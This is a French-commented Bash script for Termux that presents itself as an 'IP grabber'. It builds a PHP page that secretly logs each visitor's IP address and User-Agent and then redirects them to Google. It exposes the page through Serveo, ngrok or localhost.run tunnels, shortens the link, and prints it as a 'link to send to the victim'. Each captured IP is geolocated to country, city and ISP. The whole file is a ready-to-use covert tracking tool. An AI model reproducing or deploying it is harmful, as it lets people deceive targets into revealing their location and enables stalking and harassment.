#!/bin/bash
trap 'printf "\n";stop;exit 1' 2

# ======== COULEURS ========
R='\033[1;91m'
G='\033[1;92m'
Y='\033[1;93m'
B='\033[1;94m'
P='\033[1;95m'
C='\033[1;96m'
W='\033[1;97m'
N='\033[0m'

# ======== VARIABLES ========
SERVER="create"
PORT="3333"
LOG_FILE="ip_log.txt"

# ======== FONCTIONS ========

dependencies() {
    echo -e "${G}[+]${N} Vérification des dépendances..."
    
    command -v php > /dev/null 2>&1 || { 
        echo -e "${R}[-]${N} PHP n'est pas installé. Installation en cours..."
        pkg install php -y
    }
    
    command -v curl > /dev/null 2>&1 || { 
        echo -e "${R}[-]${N} Curl n'est pas installé. Installation en cours..."
        pkg install curl -y
    }
    
    command -v jq > /dev/null 2>&1 || { 
        echo -e "${R}[-]${N} jq n'est pas installé. Installation en cours..."
        pkg install jq -y
    }
    
    echo -e "${G}[+]${N} Toutes les dépendances sont OK !"
}

stop() {
    echo -e "${Y}[!]${N} Arrêt des processus..."
    
    # Tuer ngrok
    pkill -f ngrok > /dev/null 2>&1
    killall ngrok > /dev/null 2>&1
    
    # Tuer PHP
    pkill -f php > /dev/null 2>&1
    killall php > /dev/null 2>&1
    
    # Tuer SSH (Serveo)
    pkill -f ssh > /dev/null 2>&1
    killall ssh > /dev/null 2>&1
    
    # Nettoyer les fichiers temporaires
    rm -rf sendlink 2>/dev/null
    rm -rf iptracker.log 2>/dev/null
    
    echo -e "${G}[+]${N} Nettoyage terminé !"
}

catch_ip() {
    ip=$(grep -a 'IP:' sites/$SERVER/ip.txt | cut -d " " -f2 | tr -d '\r')
    ua=$(grep 'User-Agent:' sites/$SERVER/ip.txt | cut -d '"' -f2)
    
    echo -e "\n${G}[+]${N} ${B}IP TROUVÉE !${N}"
    echo -e "${G}[*]${N} IP: ${C}$ip${N}"
    echo -e "${G}[*]${N} User-Agent: ${C}$ua${N}"
    
    # Sauvegarder
    cat sites/$SERVER/ip.txt >> sites/$SERVER/saved.ip.txt 2>/dev/null
    
    # Géolocalisation
    echo -e "${G}[*]${N} Récupération de la géolocalisation..."
    curl -s "http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,org,as,timezone" > iptracker.log
    
    if [[ -f iptracker.log ]]; then
        status=$(jq -r .status iptracker.log 2>/dev/null)
        if [[ $status == "success" ]]; then
            country=$(jq -r .country iptracker.log 2>/dev/null)
            region=$(jq -r .regionName iptracker.log 2>/dev/null)
            city=$(jq -r .city iptracker.log 2>/dev/null)
            isp=$(jq -r .isp iptracker.log 2>/dev/null)
            
            echo -e "${G}[*]${N} Pays: ${C}$country${N}"
            echo -e "${G}[*]${N} Région: ${C}$region${N}"
            echo -e "${G}[*]${N} Ville: ${C}$city${N}"
            echo -e "${G}[*]${N} FAI: ${C}$isp${N}"
        fi
        rm -rf iptracker.log
    fi
    
    echo -e "${G}[+]${N} IP sauvegardée dans sites/$SERVER/saved.ip.txt"
    echo -e "\n${Y}[*]${N} En attente de la prochaine victime... (Ctrl+C pour arrêter)\n"
}

# ======== MÉTHODE 1: SERVERO.NET AVEC RACCOURCI ========
start_serveo() {
    echo -e "${G}[+]${N} Démarrage du serveur PHP..."
    cd sites/$SERVER && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    sleep 2
    
    echo -e "${G}[+]${N} Connexion à Serveo.net..."
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$PORT serveo.net 2>/dev/null > sendlink &
    sleep 8
    
    # Récupérer le lien
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink 2>/dev/null | head -n1)
    
    if [[ -z "$send_link" ]]; then
        echo -e "${R}[-]${N} Impossible de récupérer le lien Serveo automatiquement."
        echo -e "${Y}[!]${N} Essayez d'ouvrir manuellement:"
        echo -e "${C}ssh -R 80:localhost:$PORT serveo.net${N}"
        echo -e "${Y}[*]${N} Puis copiez le lien affiché."
    else
        # Raccourcir le lien avec is.gd
        echo -e "${G}[+]${N} Raccourcissement du lien..."
        short_link=$(curl -s "https://is.gd/create.php?format=simple&url=$send_link" 2>/dev/null)
        
        echo -e "\n${G}[+]${N} ${B}LIEN À ENVOYER À LA VICTIME :${N}"
        echo -e "${C}Direct: $send_link${N}"
        
        if [[ -n "$short_link" ]]; then
            echo -e "${C}Raccourci: $short_link${N}"
        else
            echo -e "${Y}[!]${N} Raccourcissement échoué, utilisez le lien direct."
        fi
    fi
    
    checkfound
}

# ======== MÉTHODE 2: NGROK ========
start_ngrok() {
    # Télécharger ngrok si absent
    if [[ ! -f ngrok ]]; then
        echo -e "${G}[+]${N} Téléchargement de ngrok pour Android..."
        
        # Vérifier l'architecture
        arch=$(uname -m)
        if [[ $arch == "aarch64" ]] || [[ $arch == "arm64" ]]; then
            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip
            unzip -q ngrok-stable-linux-arm64.zip
            rm -rf ngrok-stable-linux-arm64.zip
        elif [[ $arch == "arm" ]] || [[ $arch == "armv7l" ]]; then
            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
            unzip -q ngrok-stable-linux-arm.zip
            rm -rf ngrok-stable-linux-arm.zip
        else
            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
            unzip -q ngrok-stable-linux-386.zip
            rm -rf ngrok-stable-linux-386.zip
        fi
        chmod +x ngrok
        echo -e "${G}[+]${N} ngrok téléchargé avec succès !"
    fi
    
    echo -e "${G}[+]${N} Démarrage du serveur PHP..."
    cd sites/$SERVER && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    sleep 2
    
    echo -e "${G}[+]${N} Démarrage de ngrok..."
    ./ngrok http $PORT > /dev/null 2>&1 &
    sleep 8
    
    # Récupérer le lien
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*ngrok[^"]*' | head -n1)
    
    if [[ -z "$link" ]]; then
        echo -e "${R}[-]${N} Impossible de récupérer le lien ngrok."
        echo -e "${Y}[!]${N} Vérifiez que ngrok est bien lancé."
        echo -e "${Y}[*]${N} Ouvrez http://localhost:4040 dans votre navigateur"
        echo -e "${Y}[*]${N} ou utilisez l'option Serveo à la place."
    else
        # Raccourcir le lien
        echo -e "${G}[+]${N} Raccourcissement du lien..."
        short_link=$(curl -s "https://is.gd/create.php?format=simple&url=$link" 2>/dev/null)
        
        echo -e "\n${G}[+]${N} ${B}LIEN À ENVOYER À LA VICTIME :${N}"
        echo -e "${C}Direct: $link${N}"
        
        if [[ -n "$short_link" ]]; then
            echo -e "${C}Raccourci: $short_link${N}"
        fi
    fi
    
    checkfound
}

# ======== MÉTHODE 3: LOCALHOST.RUN (ALTERNATIVE GRATUITE) ========
start_localhostrun() {
    echo -e "${G}[+]${N} Démarrage du serveur PHP..."
    cd sites/$SERVER && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
    sleep 2
    
    echo -e "${G}[+]${N} Connexion à localhost.run..."
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$PORT localhost.run 2>/dev/null > sendlink &
    sleep 8
    
    send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink 2>/dev/null | head -n1)
    
    if [[ -z "$send_link" ]]; then
        echo -e "${R}[-]${N} Impossible de récupérer le lien."
        echo -e "${Y}[!]${N} Essayez: ssh -R 80:localhost:$PORT localhost.run"
    else
        echo -e "\n${G}[+]${N} ${B}LIEN À ENVOYER :${N}"
        echo -e "${C}$send_link${N}"
    fi
    
    checkfound
}

# ======== MENU ========
menu() {
    clear
    echo -e "${B}╔════════════════════════════════════════╗${N}"
    echo -e "${B}║${N}    ${G}🔥 ZETA IP GRABBER v3.0 🔥${N}        ${B}║${N}"
    echo -e "${B}║${N}    ${C}Pour Termux/Android${N}                ${B}║${N}"
    echo -e "${B}╚════════════════════════════════════════╝${N}"
    echo -e ""
    echo -e "${G}[01]${N} Serveo.net + Raccourci automatique"
    echo -e "${G}[02]${N} Ngrok + Raccourci automatique"
    echo -e "${G}[03]${N} localhost.run (alternative)"
    echo -e "${G}[99]${N} Quitter"
    echo -e ""
    read -p "$(echo -e ${G}[?]${N} Choisissez une option: )" choice
    
    case $choice in
        1|01) start_serveo ;;
        2|02) start_ngrok ;;
        3|03) start_localhostrun ;;
        99) echo -e "${R}Au revoir Alpha !${N}"; exit 0 ;;
        *) echo -e "${R}[!] Option invalide !${N}"; sleep 1; menu ;;
    esac
}

checkfound() {
    echo -e "\n${Y}[*]${N} En attente des victimes... (Ctrl+C pour arrêter)\n"
    
    while true; do
        if [[ -e "sites/$SERVER/ip.txt" ]]; then
            echo -e "\n${G}[+]${N} IP trouvée !"
            catch_ip
            rm -rf sites/$SERVER/ip.txt
        fi
        sleep 1
    done
}

# ======== CRÉATION DU DOSSIER SITES ========
setup_sites() {
    mkdir -p sites/$SERVER
    
    # Créer un fichier PHP qui capture l'IP
    cat > sites/$SERVER/index.php << 'EOF'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

$log = "[$date] IP: $ip | User-Agent: $user_agent\n";
file_put_contents('ip.txt', $log, FILE_APPEND);

header('Location: https://www.google.com');
exit;
?>
EOF
    
    echo -e "${G}[+]${N} Site de capture prêt dans sites/$SERVER/"
}

# ======== MAIN ========
main() {
    dependencies
    setup_sites
    menu
}

# ======== EXÉCUTION ========
main
